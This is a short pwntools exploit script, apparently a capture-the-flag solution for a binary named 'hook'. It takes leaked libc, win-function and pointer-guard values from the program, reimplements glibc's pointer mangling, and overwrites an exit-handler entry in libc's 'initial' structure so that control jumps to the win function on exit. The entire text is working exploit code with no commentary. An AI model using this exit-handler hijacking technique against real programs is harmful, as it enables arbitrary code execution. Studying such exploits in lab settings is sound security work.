from pwn import *

p = process("./hook")
gdb.attach(p, "b exit")

"""
def PTR_MANGLE(addr):
    return rotate_shift_left(xor(add, pointer_guard), 0x11)
"""


def rorl(x, y):
    return ((x << y) | (x >> (64 - y))) & 0xFFFF_FFFF_FFFF_FFFF


def mangle(addr):
    return rorl(addr ^ PTR_GUARD, 0x11)


p.recvuntil(b": 0x")
libc = int(p.recvline(keepends=False).decode(), 16) - 0x29CA8

p.recvuntil(b": 0x")
win_leak = int(p.recvline(keepends=False).decode(), 16)

p.recvuntil(b": 0x")
PTR_GUARD = int(p.recvline(keepends=False).decode(), 16)


initial = libc + 0x1E9000
payload = mangle(win_leak)

p.sendafter(b": ", p64(initial + 0x18))
p.sendafter(b": ", p64(payload))

p.interactive()
